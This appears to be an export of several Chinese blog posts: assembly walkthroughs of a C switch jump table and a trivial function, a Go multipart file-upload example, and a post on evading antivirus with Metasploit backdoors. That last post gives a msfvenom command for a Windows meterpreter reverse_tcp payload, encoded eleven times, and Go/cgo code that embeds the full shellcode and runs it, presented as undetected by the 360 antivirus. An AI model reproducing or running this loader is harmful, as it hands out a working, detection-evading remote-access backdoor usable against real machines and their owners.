<p>跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0040D81F  9E D7 40 00  ..@.</div><div class="line">0040D823  B1 D7 40 00  ..@.</div><div class="line">0040D827  C4 D7 40 00  ..@.</div><div class="line">0040D82B  D7 D7 40 00  ..@.</div><div class="line">0040D82F  EA D7 40 00  ..@.</div></pre></td></tr></table></figure></p>
<h2 id="0x03分支跃度大难以构成跳转表的分支结构"><a href="#0x03分支跃度大难以构成跳转表的分支结构" class="headerlink" title="0x03分支跃度大难以构成跳转表的分支结构"></a>0x03分支跃度大难以构成跳转表的分支结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</div><div class="line">	<span class="keyword">switch</span>(x)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">100</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">5:        int x = 5;</div><div class="line">00401028   mov         dword ptr [ebp-4],5</div><div class="line">6:        switch(x)</div><div class="line">7:        &#123;</div><div class="line">0040102F   mov         eax,dword ptr [ebp-4]</div><div class="line">00401032   mov         dword ptr [ebp-8],eax</div><div class="line">00401035   mov         ecx,dword ptr [ebp-8]</div><div class="line">00401038   sub         ecx,5</div><div class="line">0040103B   mov         dword ptr [ebp-8],ecx</div><div class="line">0040103E   cmp         dword ptr [ebp-8],5Fh</div><div class="line">00401042   ja          $L536+13h (004010b5)               //具体参见上一种,x大于100跳转到default</div><div class="line">00401044   mov         eax,dword ptr [ebp-8]              //edx=x-5</div><div class="line">00401047   xor         edx,edx                            //edx置零</div><div class="line">00401049   mov         dl,byte ptr  (004010ef)[eax]       //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)</div><div class="line">0040104F   jmp         dword ptr [edx*4+4010D7h]          //根据DL(EDX)的值查跳转表</div><div class="line">8:        case 5:</div><div class="line">9:            printf(&quot;%d\n&quot;,x);</div><div class="line">00401056   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401059   push        ecx</div><div class="line">0040105A   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">0040105F   call        printf (004011a0)</div><div class="line">00401064   add         esp,8</div><div class="line">10:           break;</div><div class="line">00401067   jmp         $L536+24h (004010c6)</div><div class="line">11:       case 6:</div><div class="line">12:           printf(&quot;%d\n&quot;,x);</div><div class="line">00401069   mov         edx,dword ptr [ebp-4]</div><div class="line">0040106C   push        edx</div><div class="line">0040106D   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401072   call        printf (004011a0)</div><div class="line">00401077   add         esp,8</div><div class="line">13:           break;</div><div class="line">0040107A   jmp         $L536+24h (004010c6)</div><div class="line">14:       case 7:</div><div class="line">15:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040107C   mov         eax,dword ptr [ebp-4]</div><div class="line">0040107F   push        eax</div><div class="line">00401080   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401085   call        printf (004011a0)</div><div class="line">0040108A   add         esp,8</div><div class="line">16:           break;</div><div class="line">0040108D   jmp         $L536+24h (004010c6)</div><div class="line">17:       case 8:</div><div class="line">18:           printf(&quot;%d\n&quot;,x);</div><div class="line">0040108F   mov         ecx,dword ptr [ebp-4]</div><div class="line">00401092   push        ecx</div><div class="line">00401093   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">00401098   call        printf (004011a0)</div><div class="line">0040109D   add         esp,8</div><div class="line">19:           break;</div><div class="line">004010A0   jmp         $L536+24h (004010c6)</div><div class="line">20:       case 100:</div><div class="line">21:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010A2   mov         edx,dword ptr [ebp-4]</div><div class="line">004010A5   push        edx</div><div class="line">004010A6   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010AB   call        printf (004011a0)</div><div class="line">004010B0   add         esp,8</div><div class="line">22:           break;</div><div class="line">004010B3   jmp         $L536+24h (004010c6)</div><div class="line">23:       default:</div><div class="line">24:           printf(&quot;%d\n&quot;,x);</div><div class="line">004010B5   mov         eax,dword ptr [ebp-4]</div><div class="line">004010B8   push        eax</div><div class="line">004010B9   push        offset string &quot;%d\n&quot; (0042201c)</div><div class="line">004010BE   call        printf (004011a0)</div><div class="line">004010C3   add         esp,8</div><div class="line">25:           break;</div><div class="line">26:       &#125;</div></pre></td></tr></table></figure>
<p>索引表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">004010F1  00 01 02 03 05 05 05 05  ........</div><div class="line">004010F9  05 05 05 05 05 05 05 05  ........</div><div class="line">00401101  05 05 05 05 05 05 05 05  ........</div><div class="line">00401109  05 05 05 05 05 05 05 05  ........</div><div class="line">00401111  05 05 05 05 05 05 05 05  ........</div><div class="line">00401119  05 05 05 05 05 05 05 05  ........</div><div class="line">00401121  05 05 05 05 05 05 05 05  ........</div><div class="line">00401129  05 05 05 05 05 05 05 05  ........</div><div class="line">00401131  05 05 05 05 05 05 05 05  ........</div><div class="line">00401139  05 05 05 05 05 05 05 05  ........</div><div class="line">00401141  05 05 05 05 05 05 05 05  ........</div><div class="line">00401149  05 05 05 05 05 05 05 04  ........</div></pre></td></tr></table></figure></p>
<p>跳转表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">004010D9  58 10 40 00  X.@.</div><div class="line">004010DD  6B 10 40 00  k.@.</div><div class="line">004010E1  7E 10 40 00  ~.@.</div><div class="line">004010E5  91 10 40 00  ..@.</div><div class="line">004010E9  A4 10 40 00  ..@.</div><div class="line">004010ED  B7 10 40 00  ..@.</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 逆向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最最简单的c语言函数汇编分析]]></title>
      <url>http://akkuman.coding.me/2017/09/06/%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html</url>
      <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>xp+vc6.0</p>
<h2 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>以下是vc6.0的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">1:    int plus(int x, int y)</div><div class="line">2:    &#123;</div><div class="line">00401020   push        ebp</div><div class="line">00401021   mov         ebp,esp</div><div class="line">00401023   sub         esp,40h</div><div class="line">00401026   push        ebx</div><div class="line">00401027   push        esi</div><div class="line">00401028   push        edi</div><div class="line">00401029   lea         edi,[ebp-40h]</div><div class="line">0040102C   mov         ecx,10h</div><div class="line">00401031   mov         eax,0CCCCCCCCh</div><div class="line">00401036   rep stos    dword ptr [edi]</div><div class="line">3:        return 0;</div><div class="line">00401038   xor         eax,eax</div><div class="line">4:    &#125;</div><div class="line">0040103A   pop         edi</div><div class="line">0040103B   pop         esi</div><div class="line">0040103C   pop         ebx</div><div class="line">0040103D   mov         esp,ebp</div><div class="line">0040103F   pop         ebp</div><div class="line">00401040   ret</div></pre></td></tr></table></figure></p>
<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">push      ebp</div><div class="line">mov       ebp,esp</div><div class="line">sub       esp,40h</div><div class="line">//提升栈，为函数腾出空间，为ebp寻址做准备</div><div class="line">push      ebx</div><div class="line">push      esi</div><div class="line">push      edi</div><div class="line">//寄存器压栈，保存现场</div><div class="line">lea       edi,[ebp-40h]</div><div class="line">//将ebp-40h（esp）的具体内存地址存到edi</div><div class="line">mov       ecx,10h</div><div class="line">//10（十六进制）存入计数寄存器</div><div class="line">mov       eax,0xCCCCCCCC</div><div class="line">//初始化eax</div><div class="line">rep stos  dword ptr [edi]</div><div class="line">//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-&gt;esp全部被初始化）</div><div class="line">xor       eax,eax</div><div class="line">//eax清零</div><div class="line">pop       edi</div><div class="line">pop       esi</div><div class="line">pop       ebx</div><div class="line">mov       esp,ebp</div><div class="line">pop       ebp</div><div class="line">ret</div><div class="line">//寄存器出栈，恢复现场，堆栈平衡并返回</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 逆向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Golang模拟客户端POST表单功能文件上传]]></title>
      <url>http://akkuman.coding.me/2017/07/07/Golang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFPOST%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
      <content type="html"><![CDATA[<p>客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。<br><a id="more"></a><br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"bytes"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">    <span class="string">"io"</span></div><div class="line">    <span class="string">"io/ioutil"</span></div><div class="line">    <span class="string">"mime/multipart"</span></div><div class="line">    <span class="string">"net/http"</span></div><div class="line">    <span class="string">"os"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">postFile</span><span class="params">(filename <span class="keyword">string</span>, targetUrl <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</div><div class="line">    bodyBuf := &amp;bytes.Buffer&#123;&#125;</div><div class="line">    bodyWriter := multipart.NewWriter(bodyBuf)</div><div class="line"></div><div class="line">    <span class="comment">//关键的一步操作</span></div><div class="line">    fileWriter, err := bodyWriter.CreateFormFile(<span class="string">"uploadfile"</span>, filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error writing to buffer"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//打开文件句柄操作</span></div><div class="line">    fh, err := os.Open(filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error opening file"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> fh.Close()</div><div class="line"></div><div class="line">    <span class="comment">//iocopy</span></div><div class="line">    _, err = io.Copy(fileWriter, fh)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    contentType := bodyWriter.FormDataContentType()</div><div class="line">    bodyWriter.Close()</div><div class="line"></div><div class="line">    resp, err := http.Post(targetUrl, contentType, bodyBuf)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> resp.Body.Close()</div><div class="line">    resp_body, err := ioutil.ReadAll(resp.Body)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    fmt.Println(resp.Status)</div><div class="line">    fmt.Println(<span class="keyword">string</span>(resp_body))</div><div class="line">    <span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// sample usage</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    target_url := <span class="string">"http://localhost/upload"</span></div><div class="line">    filename := <span class="string">"./example.pdf"</span></div><div class="line">    postFile(filename, target_url)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Golang </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于msf反弹后门的免杀Tips]]></title>
      <url>http://akkuman.coding.me/2017/04/20/msf-AntiVirus.html</url>
      <content type="html"><![CDATA[<p>msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧<br><a id="more"></a></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机<br>这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果</p>
<h2 id="得到shellcode"><a href="#得到shellcode" class="headerlink" title="得到shellcode"></a>得到shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 <span class="_">-e</span> x86/shikata_ga_nai -i 11 <span class="_">-f</span> py &gt; 1.py</div></pre></td></tr></table></figure>
<p>建议是生成32位的，如果想生成64位也可以，<code>-e x86/shikata_ga_nai -i 11</code>是指用<code>x86/shikata_ga_nai</code>编码迭代11次，然后生成py文件<br>py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的</p>
<h2 id="Golang环境搭建"><a href="#Golang环境搭建" class="headerlink" title="Golang环境搭建"></a>Golang环境搭建</h2><p>安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用<a href="http://tdm-gcc.tdragon.net/download" target="_blank" rel="external">TDM-GCC</a>）</p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">void call(char *code) &#123;</div><div class="line">    int (*ret)() = (int(*)())code;</div><div class="line">    ret();</div><div class="line">&#125;</div><div class="line">*/</div><div class="line"><span class="keyword">import</span> <span class="string">"C"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    buf := <span class="string">""</span></div><div class="line">    buf += <span class="string">"\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"</span></div><div class="line">    buf += <span class="string">"\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"</span></div><div class="line">    buf += <span class="string">"\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f"</span></div><div class="line">    buf += <span class="string">"\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce"</span></div><div class="line">    buf += <span class="string">"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13"</span></div><div class="line">    buf += <span class="string">"\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0"</span></div><div class="line">    buf += <span class="string">"\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e"</span></div><div class="line">    buf += <span class="string">"\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a"</span></div><div class="line">    buf += <span class="string">"\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c"</span></div><div class="line">    buf += <span class="string">"\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a"</span></div><div class="line">    buf += <span class="string">"\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47"</span></div><div class="line">    buf += <span class="string">"\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d"</span></div><div class="line">    buf += <span class="string">"\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42"</span></div><div class="line">    buf += <span class="string">"\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4"</span></div><div class="line">    buf += <span class="string">"\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79"</span></div><div class="line">    buf += <span class="string">"\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23"</span></div><div class="line">    buf += <span class="string">"\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d"</span></div><div class="line">    buf += <span class="string">"\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6"</span></div><div class="line">    buf += <span class="string">"\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2"</span></div><div class="line">    buf += <span class="string">"\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08"</span></div><div class="line">    buf += <span class="string">"\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32"</span></div><div class="line">    buf += <span class="string">"\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e"</span></div><div class="line">    buf += <span class="string">"\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5"</span></div><div class="line">    buf += <span class="string">"\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a"</span></div><div class="line">    buf += <span class="string">"\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3"</span></div><div class="line">    buf += <span class="string">"\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb"</span></div><div class="line">    buf += <span class="string">"\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35"</span></div><div class="line">    buf += <span class="string">"\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca"</span></div><div class="line">    buf += <span class="string">"\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd"</span></div><div class="line">    buf += <span class="string">"\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a"</span></div><div class="line">    buf += <span class="string">"\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab"</span></div><div class="line">    buf += <span class="string">"\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d"</span></div><div class="line">    buf += <span class="string">"\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70"</span></div><div class="line">    buf += <span class="string">"\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69"</span></div><div class="line">    buf += <span class="string">"\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0"</span></div><div class="line">    buf += <span class="string">"\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8"</span></div><div class="line">    buf += <span class="string">"\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec"</span></div><div class="line">    buf += <span class="string">"\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd"</span></div><div class="line">    buf += <span class="string">"\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17"</span></div><div class="line">    buf += <span class="string">"\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd"</span></div><div class="line">    buf += <span class="string">"\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b"</span></div><div class="line">    buf += <span class="string">"\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c"</span></div><div class="line">    buf += <span class="string">"\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c"</span></div><div class="line">    buf += <span class="string">"\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6"</span></div><div class="line">    buf += <span class="string">"\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3"</span></div><div class="line">    buf += <span class="string">"\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64"</span></div><div class="line">    buf += <span class="string">"\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65"</span></div><div class="line">    buf += <span class="string">"\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55"</span></div><div class="line">    buf += <span class="string">"\x5d\x1b\xda\x35\xc1\x2d"</span></div><div class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></div><div class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></div><div class="line">    shellcode := []<span class="keyword">byte</span>(buf)</div><div class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
